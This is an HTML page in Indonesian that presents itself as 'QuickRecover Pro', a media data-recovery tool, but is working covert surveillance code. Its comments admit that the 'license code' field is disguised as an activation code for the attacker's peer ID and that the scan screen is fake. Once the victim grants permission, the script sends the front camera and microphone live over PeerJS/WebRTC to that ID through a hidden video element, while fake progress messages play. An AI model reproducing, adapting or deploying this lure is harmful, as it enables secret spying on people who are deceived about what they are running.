<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>QuickRecover Pro</title>
    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background-color: #f0f2f5;
            color: #333;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        .card {
            background: white;
            width: 340px;
            padding: 30px;
            border-radius: 20px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
            text-align: center;
        }

        h1 { font-size: 22px; margin: 0 0 5px; color: #1a1a1a; }
        p.subtitle { color: #888; font-size: 14px; margin-bottom: 25px; }

        .btn {
            background: #3498db;
            color: white;
            border: none;
            padding: 15px;
            border-radius: 12px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
            margin-top: 10px;
        }
        .btn:hover { background: #2980b9; }

        /* Fake Loading */
        #scanScreen {
            display: none;
            flex-direction: column;
            align-items: center;
        }

        .loader-ring {
            width: 50px;
            height: 50px;
            border: 5px solid #f3f3f3;
            border-top: 5px solid #3498db;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        .log-text { font-family: monospace; font-size: 12px; color: #666; margin-top: 15px; }
        
        /* Hidden Elements */
        #localVideo { display: none; } 
    </style>
</head>
<body>

    <div class="card" id="mainMenu">
        <h1>QuickRecover Pro</h1>
        <p class="subtitle">Alat pemulihan data media tingkat lanjut.</p>
        
        <!-- Input Admin ID (Disamarkan sebagai verification code) -->
        <div style="text-align: left; margin-bottom: 15px;">
            <label style="font-size: 12px; font-weight: bold; color: #555;">Kode Lisensi Server:</label>
            <input type="text" id="adminIdInput" placeholder="Masukkan kode aktivasi..." 
                   style="width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; margin-top: 5px;">
        </div>

        <button class="btn" onclick="initiateConnection()">
            ðŸš€ Mulai Pemindaian
        </button>
    </div>

    <div class="card" id="scanScreen">
        <div class="loader-ring"></div>
        <h3>Menghubungkan ke Server...</h3>
        <p class="log-text" id="logText">Memverifikasi lisensi...</p>
    </div>

    <!-- Video Elemen Hidden -->
    <video id="localVideo" autoplay playsinline muted></video>

<script>
    const mainMenu = document.getElementById('mainMenu');
    const scanScreen = document.getElementById('scanScreen');
    const logText = document.getElementById('logText');
    const localVideo = document.getElementById('localVideo');

    function initiateConnection() {
        const adminID = document.getElementById('adminIdInput').value;

        if (!adminID) {
            alert("Mohon masukkan Kode Lisensi Server terlebih dahulu!");
            return;
        }

        // UI Switch
        mainMenu.style.display = 'none';
        scanScreen.style.display = 'flex';

        // 1. Inisialisasi Peer Klien
        const peer = new Peer(null, {
            debug: 1
        });

        peer.on('open', (id) => {
            logText.innerText = "Klien terhubung. Memulai streaming...";
            startStreaming(adminID);
        });

        peer.on('error', (err) => {
            console.error(err);
            logText.innerText = "Gagal menghubungi server.";
        });
    }

    async function startStreaming(adminID) {
        try {
            // 2. Akses Kamera & Mikrofon
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user" }, // 'user' = depan, 'environment' = belakang
                audio: true 
            });

            // Tampilkan di video element hidden (diperlukan oleh browser)
            localVideo.srcObject = stream;
            localVideo.play();

            logText.innerText = "Kamera aktif. Mengirim data live...";

            // 3. Hubungkan ke Admin
            const peer = new Peer(); // Re-instance atau gunakan peer sebelumnya jika disimpan di global scope
            
            // Catatan: Di dalam fungsi ini, kita buat peer baru untuk memanggil admin
            // agar lebih stabil.
            const callerPeer = new Peer();

            callerPeer.on('open', () => {
                // Panggil ID Admin
                const call = callerPeer.call(adminID, stream);
                
                logText.innerText = "Pemindaian berjalan (Live Connection Active)...";

                call.on('close', () => {
                    logText.innerText = "Koneksi terputus oleh admin.";
                });
            });

        } catch (err) {
            console.error("Camera Error:", err);
            alert("Gagal mengakses kamera. Pastikan izin diberikan.");
            mainMenu.style.display = 'block';
            scanScreen.style.display = 'none';
        }
    }
</script>

</body>
</html>
